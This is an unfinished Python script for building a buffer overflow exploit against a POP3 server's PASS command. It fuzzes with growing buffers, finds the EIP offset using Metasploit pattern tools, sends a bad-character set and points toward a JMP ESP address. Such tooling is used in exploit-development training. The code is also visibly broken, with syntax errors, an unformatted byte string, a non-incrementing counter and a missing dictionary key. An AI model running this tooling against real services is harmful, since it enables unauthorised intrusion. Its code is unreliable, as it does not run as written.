#!/usr/bin/python3
import argparse
import socket
import math
import time
import os

# Global Variables
ip = ''                                                     # Target IP
port = ''                                                   # Target Port
_delimiter = f'**************************************'      # User adjustable vertical process delimiters
_current_step = 0                                           # Incremental counter for tracking all steps
_known_bad_chars = []                                       # Universal storage of chars deemed problematic
payload = ''                                                # Tracking changes to payload throughout process
bad_chars = (                                               # Bad character set used for testing. (Static)
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
hex_namespace = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='Target IP Address', default='BLANK', type=str, required=True)
    parser.add_argument('-p', '--port', help='Target Port', default=110, type=int, required=True)
    parser.add_argument('-c', '--char_length', help='Character Length:6000', nargs='?', type=str, required=True)
    arguments = parser.parse_args()
    return arguments


def get_elapsed_time(_start_time, verbosity):
    global _delimiter
    seconds = round(int(time.time() - _start_time), 2)
    minutes = math.trunc(seconds / 60)
    remaining_seconds = math.trunc(seconds - (minutes * 60))
    if len(f'{remaining_seconds}') != 2:
        remaining_seconds = f'0{remaining_seconds}'
    elapsed_time = f'{minutes}:{remaining_seconds}'
    if verbosity == 'loud':
        msg = f'{_delimiter[:3]} Total_Time Elapsed: {elapsed_time} {_delimiter}\n\n'
        print(msg)
    return seconds


def send_var(_var, _ip, _port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10.0)                                          # Timeout in seconds (S)
        s.connect((_ip, _port))
        s.recv(1024)
        s.send(b'USER test\r\n')                                    # <REFACTOR> for different syntax/proto than pop3
        s.recv(1024)
        s.send(b'PASS {_var}\r\n')                                  # <REFACTOR> for different syntax/proto than pop3
        s.send(b'QUIT\r\n')                                         # <REFACTOR> for different syntax/proto than pop3
        s.close()
        result = 'pass'
    except socket.timeout:
        print(f'[-] Connection Timed Out!')
        result = 'fail'
    return result


def endian_reverse(eip_reg_value):
    value_len = len(eip_reg_value)
    while value_len !=4 and value_len != 8 and not(eip_reg_value.isalnum()):
        try_again = f'Please enter 8 byte hex or ascii only:\nEx. ascii:\t\tABCD\nEx. hex:\t\t41424344\n' \
                    f'Please try again or type \'cancel\' to exit the program.\n'
        response = input(try_again)
        if response == 'cancel':
            exit(0)
        value_len = response
    x = 1 if value_len == 4 else x = 2
    b = f'{eip_reg_value[:x].lower()}'
    u = f'{eip_reg_value[x:2*x].lower()}'
    ff = f'{eip_reg_value[2*x:3*x].lower()}'
    er = f'{eip_reg_value[3*x:].lower()}'
    reverse = f'{chr(int(er,16))}{chr(int(ff,16))}{chr(int(u,16))}{chr(int(b,16))}' if x == 2 else \
        reverse = er + ff + u + b
    return reverse


def initial_summary_msg(offset, _eip_reg_value):
    global _delimiter
    msg = f'{_delimiter}[+] Current Offset:\t\t\t\t\t{offset}\n' \
          f'[+] EIP register\'s value @Crash:\t\t{_eip_reg_value}\n' \
          f'[+] From Big to Little Endian:\t\t\t{endian_reverse(_eip_reg_value)}\n{_delimiter}'
    print(msg)


def continue_msg():
    global _delimiter
    msg = f'{_delimiter}\nPerform the following steps before continuing:\n\t1. Close Immunity\n\t2. Restart the ' \
          f'target service or reboot.\n\t3. Open Immunity and re-attach to the target process\n\t4. Un-pause ' \
          f'Immunity\nPlease type "go" or "cancel" to exit the program\n{_delimiter}\n'
    response = input(msg).lower()
    if response == 'cancel':
        exit(0)
    elif response == 'go':
        pass
    while response != 'go':
        try_again = f'Please type only "go" to continue or "cancel" to stop everything:\n'
        response = input(try_again)
        if response == 'cancel':
            exit(0)


def increase_len_msg(_char_length):
    global _delimiter
    msg = f'{_delimiter}[+] Your current buffer length is set to {_char_length} bytes.\n' \
          f'[?] Would you like to increase that to widen the buffer? (Y|N)\n'
    response = input(msg).lower()
    if response == 'y' or response == 'yes':
        msg = f'Please enter the length in ascii characters you would like:\n\t' \
              f'{_delimiter[:3]} Remember {_delimiter[:3]} each ascii character == 1 byte {_delimiter[:6]}\n'
        try:
            output = int(input(msg))
        except TypeError as e:
            raise e
    else:
        print(_delimiter)
        output = _char_length
    return output


def update_instruction_msg():
    global _delimiter
    global _current_step
    _current_step = ++_current_step
    msg = f'STEP {_current_step} {_delimiter}'
    print(msg)


def execute_command(_sys_command):
    print(f'[+] Command Used:\n[+] # user@pwn> {_sys_command}\n')
    var_return = os.popen(_sys_command).read()
    return var_return


def interactive_sanitize(_obj, _msg, _type):
    global _delimiter
    exit_option = f'[\'q\' to quit]'
    post_direction = f'Please try again.'
    while _obj.lower() != 'q':
        while not(isinstance(_obj, _type)):
            try:
                if _type == 'str':
                    _obj = f'{_obj.lower()}'
                elif _type == 'int':
                    _obj = int(_obj)
            except TypeError as error_message:
                print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
                _obj = input(f'{_msg} {exit_option}\n')
        if _type == 'alnum':
            while not(_obj.isalnum()):
                error_message = 'String input must be alphanumeric!. '
                print(f'{_delimiter}\n[+] ERROR:\n[+]{error_message}\n{post_direction}\n{_delimiter}\n')
                _obj = input(f'{_msg} {exit_option}\n').lower()
        elif _type == 'hex':
            hex_passed = 0
            while hex_passed != 1:
                try:
                    int(_obj, 16)
                    hex_passed = 1
                except Exception as error_message:
                    _obj = input(f'{_delimiter}\n{error_message}\n{_delimiter}\n{exit_option}\n{post_direction}\n\n')
    return _obj


def test_ascii_at_offset(_offset):
    output_dict = {}
    msg = 'Please input 4 ASCII Chars for testing offset: '
    test_chars = input(msg)
    while len(test_chars) != 4:
        test_chars = interactive_sanitize(test_chars, msg, 'str')
    a_buffer = 'A' * _offset
    b_buffer = f'{test_chars}'
    _buffer = []
    for char in test_chars:
        _buffer.append(char.encode('hex'))
    hex_equiv = b''.join(_buffer)
    print(f'\nHex Equivalent: {hex_equiv}\n')
    c_buffer = 'C' * 90
    new_var = f'{a_buffer}{b_buffer}{c_buffer}'
    output_dict['new_var'] = new_var
    output_dict['a_buffer'] = a_buffer
    output_dict['b_buffer'] = b_buffer
    output_dict['c_buffer'] = c_buffer
    return output_dict


def esp_region_msg():
    output_variables = {
        '1':'before',
        '2':'at_or_after'
    }
    msg = 'Is the chosen payload buffer zone before or after the ESP register?\n1.\tBefore\2.\tAt or After\n'
    response = input(msg)
    response = f'{response}'
    while response != '1' and response != '2' and not(response.isalnum()):
        msg = 'Please only enter option \'1\' or \'2\'\n' + msg
        response = input(msg)
    _esp_region = output_variables[response]
    return _esp_region


def fuzz_test(_ip, _port, _char_length):
    global _delimiter
    buffers = ["A"]
    ascii_len = 100
    buffer_max_len = _char_length/100
    while len(buffers) <= buffer_max_len:
        buffers.append("A" * ascii_len)
        ascii_len = ascii_len + 100
    current_buffer = ''

    start_time = time.time()
    for buffer in buffers:
        current_buffer = buffer
        msg = f'[+] {_ip}:{_port} <== {len(buffer)} bytes. Take note the byte length if there is unusual delay.\n'
        print(msg)
        tcp_result = send_var(buffer, _ip, _port)
        time.sleep(1)
        elapsed_time = get_elapsed_time(start_time, 'quiet')
        if tcp_result == 'fail' or elapsed_time/len(buffers) > 5.0:
            break
    msg = f'[+] Potential failure at byte length: {len(current_buffer)} bytes. Investigate target registers noting ' \
          f'any potentially overwritten.\n\tDid you have an overflow and subsequent exploitable register? (Y/N)'
    response = input(msg).lower()
    while response != 'y' and response != 'n':
        msg = 'Please only enter a \'Y\' for yes or a \'N\' for no. [Type \'exit\' or \'q\' to exit.]\n'
        response = input(msg).lower()
        if response == 'exit' or response == 'q':
            print('[BYE] -- TIP: Try to restart the script with a longer char_length.\n-c, --char_length ++\n')
            exit(0)
    msg = f'[CONTINUING] {_delimiter}'
    print(msg)
    return int(len(current_buffer))


def loop_bad_char_test(_payload, _ip, _port):
    global _delimiter
    global bad_chars
    global _known_bad_chars
    result = send_var(_payload, _ip, _port)
    print(f'{_delimiter}Payload Result:\n[Expected]:\tfail\n[Actual]:\t{result}\n\n')
    msg0 = f'[?] Did you identify a bad hex character? (\'y\' for yes, \'n\' for no, \'q\' to quit)\n'
    msg1 = f'[?] Enter the identified hex character (Ex. Enter \'0a\' for \'0x0a\')\n\'n\' for no\n\'q\' to quit\n'
    response = input(msg0).lower()
    if response == 'q':
        exit(0)
    elif response == 'n':
        pass
    while response != 'y' and response != 'n' and response != 'q':
        response = input(msg0).lower()
    while response == 'y':
        kb_chars = ', '.join(_known_bad_chars)
        bad_char = input(f'[i] Current KB Hex Characters:\t{kb_chars}\n{msg1}')
        while len(bad_char) != 2:
            print(f'Please enter only one hex value at a time (i.e. \'0a\' for \'0x0a\')\n')
            bad_char = interactive_sanitize(input(msg1), msg1, 'alnum')
            bad_char = interactive_sanitize(bad_char, msg1, 'hex')
        bad_char = interactive_sanitize(bad_char, msg1, 'alnum')
        bad_char = interactive_sanitize(bad_char, msg1, 'hex')
        bad_char = f'\x{bad_char}'
        bad_chars.strip(bad_char)
        if bad_char not in _known_bad_chars:
            _known_bad_chars.append(bad_char)
            kb_chars = ', '.join(_known_bad_chars)
            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
        while bad_char in _known_bad_chars:
            print(f'Please try again. The \'{bad_char}\' hex string has already been reported.\n')
            print(f'[i] Current KB Hex Characters:\t{kb_chars} \n{msg0}')
        response = input(msg0).lower()


def main():
    global _delimiter
    global _current_step
    global _known_bad_chars
    global hex_namespace
    global bad_chars
    global payload
    global ip
    global port
    start_time = time.time()
    args = parse_args()
    ip = args.ip
    port = args.port
    char_length = args.char_length                                              # Defaults to 6000
    msg = f'The char_length value provided ({char_length}) is not an int. Enter another value for this variable.\n'
    char_length = interactive_sanitize(char_length, msg, 'int')

    # ****************************************************************************************
    # Loop through a buffer adding 100 char length to said buffer looking for a crash.
    # Interact with user to save bad-chars to remove them from future payload build.
    # Give the user the option to increase the buffer length based on current setting.
    # ****************************************************************************************
    update_instruction_msg()
    starting_buffer_length = fuzz_test(ip, port, char_length)       # Looping, Incremental, Interactive Fuzz-Test
    msg = f'Testing suggests \'{starting_buffer_length}\' ascii buffer len, but make sure you have enough to house ' \
          f'your payload. Also, don\'t worry, you will have another chance to update this length before execution. ' \
          f'Would you like to update the variable length now? (Y/N)\n'
    response = input(msg).lower()
    while response != 'y' and response != 'n':
        response = input(msg)
    if response == 'y':
        char_length = increase_len_msg(char_length)
    elif response == 'n':
        char_length = starting_buffer_length
    error_message = 'The variable \'char_length\' must be an integer.'
    char_length = interactive_sanitize(char_length, error_message, 'int')

    # ****************************************************************************************
    # Assuming you are this far, the crash and EIP overwrite have been confirmed.
    # We are now going to send a random pattern so that we can determine the failure offset.
    # ****************************************************************************************
    update_instruction_msg()
    sys_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l {char_length}'
    var_return = execute_command(sys_command)
    send_var(var_return, ip, port)
    msg = 'Please input the EIP Register value the program failed on:\n(ex. 08048f9c)\n'
    eip_reg_value = input(msg)
    eip_reg_value = interactive_sanitize(eip_reg_value, msg, 'alnum')
    sys_command = f'/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l ' \
                  f'{str(char_length)} -q {str(endian_reverse(eip_reg_value))}'
    offset = execute_command(sys_command).split(' ')
    offset = int(offset[len(offset) - 1].strip('\n'))
    initial_summary_msg(offset, eip_reg_value)
    continue_msg()

    # ****************************************************************************************
    # Interactive user verification/sanity check that the defined offset is correct.
    # ****************************************************************************************
    update_instruction_msg()
    test_results = test_ascii_at_offset(offset)
    new_var = test_results['new_var']
    reg_test_word = test_results['reg_test_word']
    a_buffer = test_results['a_buffer']
    c_buffer = test_results['c_buffer']
    reg_test_word_reverse = endian_reverse(reg_test_word)
    send_var(new_var, ip, port)
    msg = f'[+] The updated variable now becomes....\nnew_var = (\'A\' * {offset}) +  \"{reg_test_word}\" + ' \
          f'(\'C\' * 90)\n[CONFIRM HERE] - Your EIP register should read: {reg_test_word_reverse}\nLook ' \
          f'for a register address that points to the start, or anywhere remotely close to the beginning of ' \
          f'your [A] or [C] buffer zones. This will be a good spot, to most likely place our shellcode.\n\n*** ' \
          f'NOTE Make sure we have roughly 400 bytes between this address\nand the end of your total buffer. (ie. ' \
          f'last address of last [C] buffer component)\n Otherwise, increase the total buffer length."\n\n'
    print(msg)
    msg = f'[?] Please re-enter or change the suggested offset (Suggested: {offset})\n'
    new_offset = input(msg)
    offset = interactive_sanitize(new_offset, msg, 'int')
    continue_msg()

    # ****************************************************************************************
    # Confirm full length, create payload for bad_chars test and write to file
    # ****************************************************************************************
    update_instruction_msg()
    new_len = increase_len_msg(char_length)
    while new_len == 'error':
        new_len = increase_len_msg(char_length)
    # POTENTIAL REFACTOR might be needed here if there is a different target than pop3
    c_updated_buff = ((new_len - offset - len(reg_test_word) - len(bad_chars)) * 'C')
    eip_region = esp_region_msg()
    if eip_region == 'before':
        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'       # This will change.
        # Need to investigate this and understand the steps for C Payload chosen before esp
    elif eip_region == 'at_or_after':
        payload = f'{a_buffer}{reg_test_word}{bad_chars}{c_updated_buff}'
    msg = f'[+] Update variable to:\n\tnew_var = (\'A\' * offset) + \"{reg_test_word}\" + bad_chars)\n\t' \
          f'[+] Final buffer written to \"cs.payload\"\n\t***Also, the bad_chars were added to aide ' \
          f'in the next step.\n'
    f_out = open('cs.payload','w')
    f_out.write(payload)
    f_out.close()
    print(msg)

    # ****************************************************************************************
    # Loop through bad chars test, storing bad_chars for filtering our future payload.
    # ****************************************************************************************
    # Here, we need to loop through the bad chars test with full interaction with the user and store bad ones
    update_instruction_msg()
    loop_bad_char_test(payload, ip, port)
    # Use the Reboot or restart service function here in a loop until explicit continue from user.

    # ****************************************************************************************
    # Find target Register's JMP Call (ex. JMP ESP)
    # ****************************************************************************************
    update_instruction_msg()
    msg = f'You now must find a good \'jump esp\' command and note the offset that will land us reliably into the ' \
          f'\'C\' part of the previously defined buffer. This should be the ESP buffer and note that we cannot ' \
          f'simply pass the address of \'jmp esp\' to EIP as it changes from crash to crash, but the pointer does not.'
    print(msg)
    get_elapsed_time(start_time, 'loud')
    # Good post for guidance: https://veteransec.com/2018/09/10/32-bit-windows-buffer-overflows-made-easy/

    # 10/03/2020: Project Status: Incomplete (~30% remaining)


if __name__ == "__main__":
    main()